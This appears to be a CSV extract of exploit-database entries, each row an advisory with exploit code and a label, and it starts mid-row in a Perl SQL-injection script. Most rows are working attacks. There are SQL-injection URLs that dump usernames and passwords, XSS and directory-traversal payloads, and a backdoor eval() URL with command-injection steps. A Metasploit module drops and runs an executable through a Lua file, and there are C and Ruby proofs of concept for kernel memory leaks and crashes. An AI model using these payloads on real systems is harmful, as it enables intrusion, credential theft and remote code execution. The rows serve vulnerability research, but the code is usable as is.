$E=""%2d%32%39%20%55%4e%69%6f%6e%20%73%65%4c%45%43%54%20%28%53%45%4c%45%43%54%20%47%52%4f%55%50%5f%43%4f%4e%43%41%54%28%75%73%65%72%6e%61%6d%65%2c%30%78%33%61%2c%70%61%73%73%77%6f%72%64%29%20%46%52%4f%4d%20"".$UT.""%29%2c%30%2c%30%2c%30%2c%30%2c%30%2c%30%2c%30%2c%30%2c%4e%75%4c%4c%2c%30%2c%30%2d%2d%20%2d""; $SIE = LWP::UserAgent->new() or die ""Could not initialize browser\n""; $SIE->agent('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0'); $host = $target . """".$S."""".$I."""".$E.""""; $res = $SIE->request(HTTP::Request->new(GET=>$host)); $answer = $res->content; if ($answer =~/{""id"":""(.*?)""/){  print ""[+] Success !!!\n""; print ""\n[+] Detail : $1\n""; print ""\n""; } else{print ""\n[-]Not found.\n""; }",Joomla! Component JE Photo Gallery,1
41808,"Broadcom Wi-Fi SoC - 'dhd_handle_swc_evt' Heap Overflow Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1061  Broadcom produces Wi-Fi HardMAC SoCs which are used to handle the PHY and MAC layer processing. These chips are present in both mobile devices and Wi-Fi routers, and are capable of handling many Wi-Fi related events without delegating to the host OS. On Android devices, the ""bcmdhd"" driver is used in order to communicate with the Wi-Fi SoC (also referred to as ""dongle"").  When the dongle wishes to notify the host OS of an event, it does so by encoding a special ""packet"" and transmitting it to the host. These packets have an ether type of 0x886C (referred to as ETHER_TYPE_BRCM), and do not contain actual packet data, but rather encapsulate information about events which must be handled by the driver.  After reading packets from the SDIO interface, the ""bcmdhd"" driver calls the function ""dhd_rx_frame"" to handle each of the received frames. If a frame has the special Broadcom ether type, it is passed on to an internal handling function, ""dhd_wl_host_event"". This function inspects the event code, and passes it onto the registered handlers for the given event type.  The function ""wl_notify_gscan_event"" is the registered handler for events of the following types:   -WLC_E_PFN_BEST_BATCHING   -WLC_E_PFN_SCAN_COMPLETE   -WLC_E_PFN_GSCAN_FULL_RESULT   -WLC_E_PFN_SWC   -WLC_E_PFN_BSSID_NET_FOUND   -WLC_E_PFN_BSSID_NET_LOST   -WLC_E_PFN_SSID_EXT   -WLC_E_GAS_FRAGMENT_RX (for reference, see ""wl_init_event_handler"")  Specifically, when the event code ""WLC_E_PFN_SWC"" is received, the gscan handler function calls ""dhd_handle_swc_evt"" in order to process the event's data, like so:  1.  void * dhd_handle_swc_evt(dhd_pub_t *dhd, const void *event_data, int *send_evt_bytes) 2.  { 3.      ... 4.      wl_pfn_swc_results_t *results = (wl_pfn_swc_results_t *)event_data; 5.      ... 6.      gscan_params = &(_pno_state->pno_params_arr[INDEX_OF_GSCAN_PARAMS].params_gscan); 7.      ... 8.      if (!params->results_rxed_so_far) { 9.          if (!params->change_array) { 10.             params->change_array = (wl_pfn_significant_net_t *) 11.                                    kmalloc(sizeof(wl_pfn_significant_net_t) * results->total_count, GFP_KERNEL); 12.             ... 13.         } 14.     } 15.     ... 16.     change_array = &params->change_array[params->results_rxed_so_far]; 17.     memcpy(change_array, results->list, sizeof(wl_pfn_significant_net_t) * results->pkt_count); 18.     params->results_rxed_so_far += results->pkt_count; 19.     ... 20. }  (where ""event_data"" is the arbitrary data encapsulated in the event passed in from the dongle)  When the function above is first invoked, the value of ""params->change_array"" is NULL. An attacker controlling the dongle may send a crafted WLC_E_PFN_SWC event, with the following values:    - results->total_count = SMALL_VALUE   - result->pkt_count = LARGE_VALUE  Since the function fails to verify that ""pkt_count"" is not larger than ""total_count"", this would cause the allocated buffer (lines 10-11) to be smaller than the size used in the memcpy operation (line 17), thus overflowing the buffer.  I've been able to statically verify these issues on the ""bcmdhd-3.10"" driver, and in the corresponding ""bcmdhd"" driver on the Nexus 6P's kernel (angler).  Adding sample EtherType exploit which achieves kernel code execution on the Nexus 5.  This exploit uses scapy-fakeap to broadcast a dummy network. The exploit starts the attack once a client with the target MAC connects to the network and sends an ARP request.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41808.zip",Broadcom Wi-Fi SoC,1
34731,"DragDropCart - '/includes/ajax/getstate.php?prefix' Cross-Site Scripting source: https://www.securityfocus.com/bid/43478/info   DragDropCart is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/demo/includes/ajax/getstate.php?country=1&prefix=1>""><ScRiPt %0A%0D>alert(712244301211)%3B</ScRiPt>",DragDropCart,1
42747,"Microsoft Windows Kernel - 'win32k!NtGdiGetFontResourceInfoInternalW' Stack Memory Disclosure /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1275  We have discovered that the nt!NtGdiGetFontResourceInfoInternalW system call discloses portions of uninitialized kernel stack memory to user-mode clients.  This is caused by the fact that for user-specified output buffer sizes up to 0x5c, a temporary stack-based buffer is used by the syscall for optimization. As opposed to the pool allocation, the stack memory area is not pre-initialized with zeros, and when it is copied back to user-mode in its entirety, its contents disclose leftover kernel stack bytes containing potentially sensitive information.  The vulnerability is fixed in Windows 10, which has the following memset() call at the beginning of the function:  --- cut --- .text:0025F9E6                 push    5Ch             ; size_t .text:0025F9E8                 push    ebx             ; int .text:0025F9E9                 lea     eax, [ebp+var_118] .text:0025F9EF                 push    eax             ; void * .text:0025F9F0                 call    _memset --- cut ---  This indicates that Microsoft is aware of the bug but didn't backport the fix to systems earlier than Windows 10. The issue was in fact discovered by cross-diffing the list of memset calls between Windows 7 and Windows 10, which illustrates how easy it is to use exclusive patches for one system version to attack another.  The attached proof-of-concept program demonstrates the disclosure. An example output is as follows:  --- cut --- 00000000: 00 00 00 00 a9 fb c2 82 02 00 00 00 19 00 00 00 ................ 00000010: 00 00 00 00 46 69 6c 65 a8 6f 06 89 46 69 6c 65 ....File.o..File 00000020: c8 00 00 00 ff 07 00 00 00 00 00 00 00 30 06 89 .............0.. 00000030: 00 08 00 00 46 02 00 00 68 72 b8 93 d0 71 b8 93 ....F...hr...q.. 00000040: a8 71 b8 93 00 8b 2e 9a 98 a8 a2 82 68 8b 2e 9a .q..........h... 00000050: fa a8 a2 82 a8 71 b8 93 46 69 6c e5 ?? ?? ?? ?? .....q..Fil..... --- cut ---  Only the first four bytes of the data are properly initialized to 0x00, while the rest are visibly leaked from the kernel stack and contain a multitude of kernel-space addresses, readily facilitating exploitation of other memory corruption vulnerabilities.  The bug is limited to leaking at most ~0x5c bytes at a time, as specifying a larger size will provoke a correctly padded pool allocation instead of the stack-based buffer.  Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space. */  #include <Windows.h> #include <cstdio>  // Undocumented definitions for the gdi32!GetFontResourceInfoW function. typedef BOOL(WINAPI *PGFRI)(LPCWSTR, LPDWORD, LPVOID, DWORD);  VOID PrintHex(PBYTE Data, ULONG dwBytes) {   for (ULONG i = 0; i < dwBytes; i += 16) {     printf(""%.8x: "", i);      for (ULONG j = 0; j < 16; j++) {       if (i + j < dwBytes) {         printf(""%.2x "", Data[i + j]);       }       else {         printf(""?? "");       }     }      for (ULONG j = 0; j < 16; j++) {       if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {         printf(""%c"", Data[i + j]);       }       else {         printf(""."");       }     }      printf(""\n"");   } }  int main() {   // Resolve the GDI32!GetFontResourceInfoW symbol.   HINSTANCE hGdi32 = LoadLibrary(L""gdi32.dll"");   PGFRI GetFontResourceInfo = (PGFRI)GetProcAddress(hGdi32, ""GetFontResourceInfoW"");    // Trigger the vulnerability and dump kernel stack output. The code assumes that Windows is   // installed on partition C:\ and the C:\Windows\Fonts\arial.ttf font is present on disk.   BYTE OutputBuffer[0x5c] = { /* zero padding */ };   DWORD OutputSize = sizeof(OutputBuffer);   if (!GetFontResourceInfo(L""C:\\Windows\\Fonts\\arial.ttf"", &OutputSize, OutputBuffer, 5)) {     printf(""GetFontResourceInfo failed.\n"");     return 1;   }    PrintHex(OutputBuffer, sizeof(OutputBuffer));    return 0; }",Microsoft Windows Kernel,1
30795,GWExtranet - Multiple Directory Traversal Vulnerabilities source: https://www.securityfocus.com/bid/26525/info  GWExtranet is prone to multiple directory-traversal vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to retrieve arbitrary files from the vulnerable system in the context of the webserver process. Information obtained may aid in further attacks.   http://www.example.com/gwextranet/scp.dll/sendto?user=calendar+of+events&mid=474020FA.GWEMAIL_DEPOT.SDEPO.100.167656B.1.1B00.1&template=.././../../boot.ini%00 http://www.example.com/gwextranet/scp.dll/nbfile?user=calendar%20of%20events&format=&mid=46FA2724.GWEMAIL_DEPOT.SDEPO.100.167656B.1.198E.1&folder=Calendar&altcolor=cccccc&template=gwextra&caldays=1&startday=&file=../scp.dll,GWExtranet,1
22277,"Nuked-klaN 1.3 - Remote Information Disclosure source: https://www.securityfocus.com/bid/6917/info  A vulnerability has been discovered in Nuked-Klan which may be exploited to execute certain PHP functions on a target server. This issue occurs in the 'Team', 'News', and 'Lien' modules and is due to insufficient sanitization of user-supplied URI parameters.  This issue may be exploited by a remote attacker to obtain sensitive server information, which could aid in launching further attacks against a target system.  The vulnerability was reported for Nuked-Klan beta 1.3; earlier versions may also be affected.   http://www.example.org/index.php?file=Team&op=phpinfo http://www.example.org/index.php?file=News&op=phpinfo http://www.example.org/index.php?file=Liens&op=phpinfo",Nuked-klaN,1
47542,"AUO SunVeillance Monitoring System 1.1.9e - 'MailAdd' SQL Injection # Exploit Title: AUO SunVeillance Monitoring System 1.1.9e - 'MailAdd' SQL Injection # Date: 2019-10-24 # Exploit Author: Luca.Chiou # Vendor Homepage: https://www.auo.com/zh-TW # Version: AUO SunVeillance Monitoring System all versions prior to v1.1.9e # Tested on: It is a proprietary devices: https://solar.auo.com/en-global/Support_Download_Center/index # CVE: N/A  # 1. Description: # AUO SunVeillance Monitoring System all versions prior to v1.1.9e that is vulnerable to SQL Injection. # The vulnerability can allow the attacker inject maliciously SQL command to the server which allows  # the attacker to read privileged data.  # 2. Proof of Concept:  (1) Access the sending mail page of AUO SunVeillance Monitoring System  (/Solar_Web_Portal/mvc_send_mail.aspx) without any authentication.      There is a parameter, MailAdd, in mvc_send_mail.aspx. (2) Modify the value of parameter MailAdd with single quotation. The error messages contains oracle database information. (3) By using sqlmap tools, attacker can acquire the database list which in server side.  cmd: sqlmap.py -u “https://<host>/Solar_Web_Portal/mvc_send_mail.aspx?MailAdd=” -p MailAdd –dbs  (4) Furthermore, there are a few SQL Injection vulnerabilities in other fields.  picture_manage_mvc.aspx (parameter: plant_no) swapdl_mvc.aspx (parameter: plant_no) account_management.aspx (parameter: Text_Postal_Code, Text_Dis_Code)  Thank you for your kind assistance.  Luca",AUO SunVeillance Monitoring System,1
34239,"Status2k Server Monitoring Software - Multiple Vulnerabilities # Exploit Title: Status2k Multiple Vulnerabilities/0days # Date: 6/20/2014 # Exploit Author: Shayan Sadigh (twitter.com/r1pplex) | <ienjoy.ripples@gmail.com # Vendor Homepage: http://status2k.com/ # Version: All # Tested on: Linux/Windows # CVE : CVE-2014-5088, CVE-2014-5089, CVE-2014-5090, CVE-2014-5091, CVE-2014-5092, CVE-2014-5093, CVE-2014-5094  1. Cross site scripting/XSS... there's tons, example admin login page, etc  login.php:  if (isset($_GET['username'])) { $useren = $_GET['username']; } if (isset($_POST['password'])) { $useren = $_POST['username']; } $q = mysql_query(""SELECT * FROM "".$prefix.""users""); $adminuser = $res['adminuser']; // Login Database $cusername = $_COOKIE[""S2KUser""]; if ( ($cusername == $adminuser) && ($cpassword == $adminpass) ) { $lgtrue = 1; } if ( ($useren == $adminuser) && ($passen == $adminpass) ) { setcookie(""S2KUser"", $useren); if ($passen && $useren) { if ($useren !== $adminuser) { echo '<div class=""alert-message error""                               Username ('.$useren.') Incorrect.</div'; }         <input type=""text"" name=""username"" size=""25""   simple injection can be done in the username field, <scriptalert(""poc"")</script, etc  Use CVE-2014-5088 for all of the XSS issues.   2. SQLi vulnerability in the GET (log) param... This isn't too useful seeing that if you had auth, much more damage could be done - refer to command injection lack of sanitization: in /admin/options/logs.php  $l = $_GET['log'];   $q = mysql_query(""SELECT * FROM "".$prefix.""users"");   $query = mysql_query(""SELECT * FROM "".$prefix.""logs WHERE id = '"".$l.""'"");   $result = mysql_fetch_array($query) or die(mysql_error());     $query = mysql_query(""SELECT * FROM "".$prefix.""logs WHERE id = '"".$l.""'"");     $result = mysql_fetch_array($query) or die(mysql_error());     $query = mysql_query(""SELECT * FROM "".$prefix.""logs WHERE id = '"".$l.""'"");     $result = mysql_fetch_array($query) or die(mysql_error());  - PoC: site.com/s2kdir/admin/options/logs.php?log=[sqli]  Use CVE-2014-5089.   3. Command injection This requires access to the Status2k Admin Panel, log-in and proceed to click the 'Logs' tab, then select 'Add Logs', type in any name and for the 'Location' field use command injection... Then browse to the created log via the 'Logs' tab again.  - example: Logs --Add Logs --; then Logs --newly created log  Name: test Location: /var/log/dmesg;pwd; uname -a localhost/admin/options/addlog.php?type=edit&id=5  so there's no sanitization in addlog.php which lets you put anything you want as a log location... the issue now is that in logs.php:  $logc = cmdrun($config['logcmd'].$result['location']);     $log = explode(""\n"", $logc);     $log = array_reverse($log);  cmdrun literally calls the equivalent of exec() and thus completely execution of a command.  if it is complaining about dmesg... try other log locations... such as /usr/local/apache/logs/suexec_log, also try other bash chars, such as  | & && ; $(), etc  Use CVE-2014-5090.   4. eval() [RCE] backdoor.. For about a year, status2k.com was hosting a backdoored version of their software... either they knew it or not, there was never an announcement when the backdoor was found (good job).  in the file /includes/functions.php: eval($_GET['multies']);  site.com/s2k/includes/functions.php?multies=inject_php_code here  PoC: site.com/s2k/includes/functions.php?multies=echo 'foobar';  Use CVE-2014-5091.   5. Another RCE status2k also lacks sanitization in the templates; /admin/options/editpl.php  one can literally place any malicious php code they want here and have it execute  // Let's make sure the file exists and is writable first. if (is_writable(""../../templates/"".$config['templaten'].""/"".$filename)) {      // In our example we're opening $filename in append mode.     // The file pointer is at the bottom of the file hence     // that's where $somecontent will go when we fwrite() it.     if (!$handle = fopen(""../../templates/"".$config['templaten'].""/"".$filename, 'w')) {          echo ""Cannot open file (../../templates/"".$config['templaten'].""/"".$filename."")"";          exit;     }      // Write $somecontent to our opened file.     if (fwrite($handle, $value) === FALSE) {         echo ""Cannot write to file (../../templates/"".$config['templaten'].""/"".$filename."")"";         exit;     } else { echo ""Success, $filename updated!"";  once again complete lack of sanitization.  Use CVE-2014-5092.   6. Design flaw by default Status2k does not remove the install directory (/install/), this may lead to an attacker resetting the admin credentials and thus logging in and causing further damage through RCE vectors listed above.  Use CVE-2014-5093.   7. Information leak... it is not shown by default on the index.php of status2k above version 2, however // PHPINFO ========== // ================== $action = $_GET[""action""]; if ($action == ""phpinfo"") { phpinfo(); die(); } allows anyone to view the server's phpinfo page (localhost/status/index.php?action=phpinfo)  Use CVE-2014-5094.",Status2k Server Monitoring Software,1
42987,"phpMyFAQ 2.9.8 - Cross-Site Scripting (2) # Exploit Title: phpMyFAQ 2.9.8 Stored XSS # Vendor Homepage: http://www.phpmyfaq.de/ # Software Link: http://download.phpmyfaq.de/phpMyFAQ-2.9.8.zip # Exploit Author: Ishaq Mohammed # Contact: https://twitter.com/security_prince # Website: https://about.me/security-prince # Category: webapps # CVE: CVE-2017-14619  1. Description  Cross-site scripting (XSS) vulnerability in phpMyFAQ through 2.9.8 allows remote attackers to inject arbitrary web script or HTML via the ""Title of your FAQ"" field in the Configuration Module.  http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14619 https://securityprince.blogspot.fr/2017/10/cve-2017-14619-phpmyfaq-298-cross-site_92.html  2. Proof of Concept  Steps to Reproduce:     1. Open the affected link http://localhost/phpmyfaq/admin/?action=config    with logged in user with administrator privileges    2. Enter the <marquee onscroll=alert(document.cookie)> in the “Title of    your FAQ field”    3. Save the Configuration    4. Login using any other user or simply click on the phpMyFAQ on the    top-right hand side of the web portal   3. Solution:  The Vulnerability will be fixed in the next release of phpMyFAQ",phpMyFAQ,1
18125,"Wireshark - console.lua pre-loading (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpServer::HTML 	include Msf::Exploit::EXE  	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""Wireshark console.lua pre-loading vulnerability"", 			'Description'    => %q{ 					This modules exploits a vulnerability in Wireshark 1.6 or less. When opening a 				pcap file, Wireshark will actually check if there's a 'console.lua' file in the same 				directory, and then parse/execute the script if found.  Versions affected by this 				vulnerability: 1.6.0 to 1.6.1, 1.4.0 to 1.4.8 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'sinn3r',  #Metasploit 				], 			'References'     => 				[ 					['CVE', '2011-3360'], 					['OSVDB', '75347'], 					['URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=6136'], 					['URL', 'http://technet.microsoft.com/en-us/security/advisory/2269637'] 				], 			'Payload'        => 				{ 					'BadChars' => ""\x00"", 				}, 			'DefaultOptions'  => 				{ 					'ExitFunction' => ""none"" 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					['Wireshark 1.6.1 or less', {}], 				], 			'Privileged'     => false, 			'DisclosureDate' => ""Jul 18 2011"",  #Didn't go public until 2011-09-21 though 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptPort.new('SRVPORT',     [ true, ""The daemon port to listen on (do not change)"", 80 ]), 				OptString.new('SHARENAME', [ true, ""The name of the top-level share."", ""files""]), 				OptString.new('URIPATH',   [ true, ""The URI to use"", ""/"" ]), 				OptString.new('FILENAME',  [ true, ""The name of the pcap file"", ""msf.pcap""]) 			], self.class)  		deregister_options('SSL', 'SSLVersion') # WebDAV does not support SSL 	end  	def on_request_uri(cli, request) 		case request.method 		when 'OPTIONS' 			process_options(cli, request) 		when 'PROPFIND' 			process_propfind(cli, request) 		when 'GET' 			process_get(cli, request) 		else 			print_status(""#{cli.peerhost}:#{cli.peerport} #{request.method} => 404 (#{request.uri})"") 			resp = create_response(404, ""Not Found"") 			resp.body = """" 			resp['Content-Type'] = 'text/html' 			cli.send_response(resp) 		end 	end  	def process_get(cli, request) 		print_status(""URI requested: #{request.uri.to_s}"") 		if request.uri =~ /\.lua$/ 			# Load lua script 			print_status(""Sending lua script"") 			send_response(cli, @p, {'Content-Type'=>'application/octet-stream'}) 		elsif request.uri =~ /#{datastore['FILENAME']}/ 			# Load an empty pcap file 			# Format reference: http://wiki.wireshark.org/Development/LibpcapFileFormat 			pcap = '' 			pcap << ""\xd4\xc3\xb2\xa1""  #Magic number 			pcap << ""\x02\x00""          #Major version number 			pcap << ""\x04\x00""          #Minor version number 			pcap << ""\x00\x00\x00\x00""  #GMT to local correction 			pcap << ""\x00\x00\x00\x00""  #Accuracy of timestamp 			pcap << ""\xff\xff\x00\x00""  #Maxlength of captured packets in octets 			pcap << ""\x01\x00\x00\x00""  #Data length type 			print_status(""Sending fake pcap file"") 			send_response(cli, pcap, {'Content-Type'=>'application/octet-stream'}) 		else 			# Don't know the request, return not found 			print_error(""Don't care about this file, 404"") 			send_not_found(cli) 		end 		return 	end  	def process_options(cli, request) 		vprint_status(""#{cli.peerhost}:#{cli.peerport} OPTIONS #{request.uri}"") 		headers = { 			'MS-Author-Via' => 'DAV', 			'DASL'          => '<DAV:sql>', 			'DAV'           => '1, 2', 			'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH', 			'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK', 			'Cache-Control' => 'private' 		}  		resp = create_response(207, ""Multi-Status"") 		headers.each_pair {|k,v| resp[k] = v } 		resp.body = '' 		resp['Content-Type'] = 'text/xml' 		cli.send_response(resp) 	end  	def process_propfind(cli, request) 		path = request.uri 		vprint_status(""Received WebDAV PROPFIND request from #{cli.peerhost}:#{cli.peerport} #{path}"") 		body = ''  		my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST'] 		my_uri    = ""http://#{my_host}/""  		if path !~ /\/$/ 			if path.index(""."") 				print_status(""Sending 404 for #{path} ..."") 				resp = create_response(404, ""Not Found"") 				resp['Content-Type'] = 'text/html' 				cli.send_response(resp) 				return 			else 				print_status(""Sending 301 for #{path} ..."") 				resp = create_response(301, ""Moved"") 				resp[""Location""] = path + ""/"" 				resp['Content-Type'] = 'text/html' 				cli.send_response(resp) 				return 			end 		end  		print_status(""Sending directory multistatus for #{path} ..."")  		body = <<-BODY 		<?xml version=""1.0"" encoding=""utf-8""?> 		<D:multistatus xmlns:D=""DAV:"" xmlns:b=""urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/""> 		<D:response xmlns:lp1=""DAV:"" xmlns:lp2=""http://apache.org/dav/props/""> 		<D:href>#{path}</D:href> 		<D:propstat> 		<D:prop> 		<lp1:resourcetype><D:collection/></lp1:resourcetype> 		<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate> 		<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified> 		<lp1:getetag>""#{""%.16x"" % rand(0x100000000)}""</lp1:getetag> 		<D:supportedlock> 		<D:lockentry> 		<D:lockscope><D:exclusive/></D:lockscope> 		<D:locktype><D:write/></D:locktype> 		</D:lockentry> 		<D:lockentry> 		<D:lockscope><D:shared/></D:lockscope> 		<D:locktype><D:write/></D:locktype> 		</D:lockentry> 		</D:supportedlock> 		<D:lockdiscovery/> 		<D:getcontenttype>httpd/unix-directory</D:getcontenttype> 		</D:prop> 		<D:status>HTTP/1.1 200 OK</D:status> 		</D:propstat> 		</D:response> 		BODY  		body = body.gsub(/^\t\t/, '')  		if request[""Depth""].to_i > 0 			if path.scan(""/"").length < 2 				body << generate_shares(path) 			else 				#Set filenames, and set the hidden attribute 				filenames = 					[ 						['console.lua', true], 						[datastore['FILENAME'], false] 					] 				body << generate_files(path, filenames) 			end 		end  		body << ""</D:multistatus>""  		body.gsub!(/\t/, '')  		# send the response 		resp = create_response(207, ""Multi-Status"") 		resp.body = body 		resp['Content-Type'] = 'text/xml; charset=""utf8""' 		cli.send_response(resp) 	end  	def gen_timestamp(ttype=nil) 		::Time.now.strftime(""%a, %d %b %Y %H:%M:%S GMT"") 	end  	def gen_datestamp(ttype=nil) 		::Time.now.strftime(""%Y-%m-%dT%H:%M:%SZ"") 	end  	def generate_shares(path) 		share_name = datastore['SHARENAME'] 		share = <<-SHARE 		<D:response xmlns:lp1=""DAV:"" xmlns:lp2=""http://apache.org/dav/props/""> 		<D:href>#{path}#{share_name}/</D:href> 		<D:propstat> 		<D:prop> 		<lp1:resourcetype><D:collection/></lp1:resourcetype> 		<lp1:creationdate>#{gen_datestamp}</lp1:creationdate> 		<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified> 		<lp1:getetag>""#{""%.16x"" % rand(0x100000000)}""</lp1:getetag> 		<D:supportedlock> 		<D:lockentry> 		<D:lockscope><D:exclusive/></D:lockscope> 		<D:locktype><D:write/></D:locktype> 		</D:lockentry> 		<D:lockentry> 		<D:lockscope><D:shared/></D:lockscope> 		<D:locktype><D:write/></D:locktype> 		</D:lockentry> 		</D:supportedlock> 		<D:lockdiscovery/> 		<D:getcontenttype>httpd/unix-directory</D:getcontenttype> 		</D:prop> 		<D:status>HTTP/1.1 200 OK</D:status> 		</D:propstat> 		</D:response> 		SHARE 		share = share.gsub(/^\t\t/, '') 		return share 	end  	def generate_files(path, items) 		trail = path.split(""/"") 		return """" if trail.length < 2  		files = """" 		items.each do |f, hide| 			h = hide ? '1' : '0' 			files << <<-FILES 			<D:response xmlns:lp1=""DAV:"" xmlns:lp2=""http://apache.org/dav/props/""> 			<D:href>#{path}#{f}</D:href> 			<D:propstat> 			<D:prop> 			<lp1:resourcetype/> 			<lp1:creationdate>#{gen_datestamp}</lp1:creationdate> 			<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength> 			<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified> 			<lp1:getetag>""#{""%.16x"" % rand(0x100000000)}""</lp1:getetag> 			<lp2:executable>T</lp2:executable> 			<D:supportedlock> 			<D:lockentry> 			<D:lockscope><D:exclusive/></D:lockscope> 			<D:locktype><D:write/></D:locktype> 			</D:lockentry> 			<D:lockentry> 			<D:lockscope><D:shared/></D:lockscope> 			<D:locktype><D:write/></D:locktype> 			</D:lockentry> 			</D:supportedlock> 			<D:lockdiscovery/> 			<D:getcontenttype>application/octet-stream</D:getcontenttype> 			</D:prop> 			<D:status>HTTP/1.1 200 OK</D:status> 			<D:ishidden b:dt=""boolean"">#{h}</D:ishidden> 			</D:propstat> 			</D:response> 			FILES 		end  		files = files.gsub(/^\t\t\t/, '')  		return files 	end  	def get_lua_payload 		# Generate our executable payload, and then convert every byte 		# in decimal format 		p = generate_payload_exe 		buf = '' 		p.each_byte do |b| 			buf << ""\\#{b.to_s}"" 		end  		# Create the lua script that contains our payload 		var_payload_name = rand_text_alpha(5) 		var_temp_name    = rand_text_alpha(5) 		lua_script = <<-LUA 		#{var_payload_name} = ""#{buf}""  		#{var_temp_name} = os.getenv(""TEMP"") .. os.tmpname() .. "".exe"" 		local f = io.open(#{var_temp_name}, ""wb"") 		f:write(#{var_payload_name}) 		f:close() 		os.execute(#{var_temp_name}) 		LUA  		lua_script = lua_script.gsub(/^\t\t/, '') 		return lua_script 	end  	def exploit 		@p = get_lua_payload 		super 	end end  =begin Example of how to open the share: My Computer -> Tools -> Map Network Driver -> Sign up for online storage or connect to a network server -> Choose another network location -> enter the network address  On an unpatched XP SP3 (and other Windows systems), the ideal URI format is like this: http://192.168.1.11/ But on a fully patched XP SP3, the same URI format will not work. Windows will try to list the share via SMB, and the victim will not see the share.  In this case, you should specify the URI to like this: http://192.168.1.11/files =end",Wireshark,1
27028,"LogicBill 1.0 - Multiple SQL Injections source: https://www.securityfocus.com/bid/16132/info  LogicBill is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/helpdesk.php?__mode=[SQL] http://www.example.com/helpdesk.php?__mode=view&__id=[SQL]",LogicBill,1
18352,"Advanced Image Hosting Script - SQL Injection # Exploit Title: AIHS (Advanced Image Hosting Script) SQL Injection Vulnerability # Author: Robert Cooper ( Robert.Cooper [at] areyousecure.net ) # Software Link: http://yabsoft.com/ # Tested on: [Linux/Windows 7]  #Vulnerable File:   view_comments.php  #Vulnerable parameter:  view_comments.php?gal=[gallery id]    ############################################################## PoC:   www.example.com/view_comments.php?gal=109 union all select 1,2,3,4,5,6,7,group_concat(id,0x3a,user,0x3a,pass,0x0a) FROM users--   ##############################################################  www.areyousecure.net  www.websiteauditing.org    # Shouts to the Belegit crew",Advanced Image Hosting Script,1
38791,"Audacious 3.7 - ID3 Local Crash (PoC) # Exploit Title: Audacious 3.7 ID3 Local Crash PoC # Date: 11-20-2015 # Exploit Author: Antonio Z. # Vendor Homepage: http://audacious-media-player.org/ # Software Link: http://audacious-media-player.org/download | http://distfiles.audacious-media-player.org/audacious-3.7-win32.zip # Version: 3.7 # Tested on: Windows 7 SP1 x64, Windows 8.1 x64, Windows 10 x64, Debian 8.2 x86-x64 # Comment: Issue was reported: http://redmine.audacious-media-player.org/issues/595  require 'fileutils' require 'mp3info'  evil = 'A' * 1048576  FileUtils.cp 'Test_Case.mp3', 'Test_Case_PoC.mp3'  Mp3Info.open('Test_Case_PoC.mp3') do |mp3|   mp3.tag.artist = evil end",Audacious,1
33708,"FreeBSD 8.0 / OpenBSD 4.x - 'ftpd' Null Pointer Dereference Denial of Service // source: https://www.securityfocus.com/bid/38559/info  The FreeBSD and OpenBSD 'ftpd' service is prone to a denial-of-service vulnerability because of a NULL-pointer dereference.  Successful exploits may allow remote attackers to cause denial-of-service conditions. Given the nature of this issue, attackers may also be able to run arbitrary code, but this has not been confirmed.  This issue affects the following releases:  FreeBSD 8.0, 6.3, 4.9 OpenBSD 4.5 and 4.6   #include <glob.h> #include <stdio.h>  #define MAXUSRARGS      100 #define MAXGLOBARGS     1000  void do_glob() {         glob_t gl;         char **pop;          char buffer[256];         strcpy(buffer, ""{A*/../A*/../A*/../A*/../A*/../A*/../A*}"");          int flags = GLOB_BRACE|GLOB_NOCHECK|GLOB_TILDE;         memset(&gl, 0, sizeof(gl));         gl.gl_matchc = MAXGLOBARGS;         flags |= GLOB_LIMIT;         if (glob(buffer, flags, NULL, &gl)) {                 printf(""GLOB FAILED!\n"");                 return 0;         }         else //                for (pop = gl.gl_pathv; pop && *pop && 1 < (MAXGLOBARGS-1);                 for (pop = gl.gl_pathv; *pop && 1 < (MAXGLOBARGS-1);                      pop++) {                         printf(""glob success"");                         return 0;                 }         globfree(&gl); }  main(int argc, char **argv) {         do_glob();         do_glob(); }",FreeBSD,1
